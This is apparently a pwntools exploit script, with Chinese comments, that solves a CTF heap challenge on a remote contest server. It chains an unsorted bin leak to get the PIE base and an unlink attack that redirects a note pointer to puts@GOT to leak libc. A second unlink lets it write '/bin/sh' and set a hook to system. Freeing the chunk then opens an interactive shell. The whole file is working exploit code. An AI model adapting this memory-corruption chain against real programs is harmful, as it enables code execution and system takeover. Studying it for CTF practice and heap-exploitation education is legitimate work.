from pwn import*
#一共两次unlink攻击加上一次unsorted bin attack
# p=process('./pwn')
p=remote('ctf.npusec.org.cn',11655)
context.log_level='debug'
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
def add(index,size):
  p.sendlineafter(b'>',b'1')
  p.sendlineafter(b'Index: ',str(index).encode())
  p.sendlineafter(b'Size: ',str(size).encode())

def delete(index):
  p.sendlineafter(b'>',b'2')
  p.sendlineafter(b'Index: ',str(index).encode())

def edit(index,content):
  p.sendlineafter(b'>',b'3')
  p.sendlineafter(b'Index: ',str(index).encode())
  p.sendlineafter(b'Content: ',content)

def show(index):
  p.sendlineafter(b'>',b'4')
  p.sendlineafter(b'Index: ',str(index).encode())
# gdb.attach(p)
# pause()
add(0,0x80)
add(1,0x80)
add(2,0x80)
add(3,0x80)
add(4,0x80)
add(5,0x80)
delete(0)
show(0)
#unsorted bin attack泄露pie基地址,正常情况下泄露的应该是libc基址
#但是这道题的chunk是程序自己定义的一个数组空间，而不是位于heap中的真实chunk
#并且main_arena等结构体也是自己定义，位于bss段，因此泄露的是pie基址
leak=u64(p.recvline().strip().ljust(8,b'\x00'))
log.info('leak:'+hex(leak))
pie_base=leak-0x3808
log.info('pie_base:'+hex(pie_base))
put_got=elf.got['puts']+pie_base
notes=pie_base+0x3880
fake_fd=notes-0x18
payload1=p64(fake_fd)+p64(put_got)
edit(0,payload1)
delete(1)
show(0)
#第一次unlink攻击泄露libc基地址，关键是在notes上进行修改，notes就是存放chunk指针的数组
#此处将chunk0的指针修改成了put_got，因此show打印出的是put_got处的值也就是真实地址
#这次的libc虽然为2.35，但是由于free和malloc由程序自己定义，所以没有unlink检查，并且存在hook
leak=u64(p.recvline().strip().ljust(8,b'\x00'))
libc_base=leak-libc.symbols['puts']
log.info('libc_base:'+hex(libc_base))
system=libc_base+libc.symbols['system']
bin_sh=libc_base+next(libc.search(b'/bin/sh'))
log.info('system:'+hex(system))
log.info('bin_sh:'+hex(bin_sh))
delete(3)
fake_fd2=notes-0x18+4*8
addr1=pie_base+0x3880+4*8
payload2=p64(fake_fd2)+p64(addr1)
edit(3,payload2)
delete(4)
edit(4,p64(bin_sh))
#第二次unlink攻击将notes[4]处的值修改成了notes[4]地址本身，因此edit(4)就相当于修改了notes[4]处的值为bin_sh地址
# 最后delete(4)就相当于调用了system(bin_sh),因为后面hook已经被改成了system
p.sendlineafter(b'>',b'6')
p.sendlineafter(b'give me a hook\n',hex(system).encode())
delete(4)
p.interactive()
#onegadget全不可用，因此用system('/bin/sh')的方式拿到shell


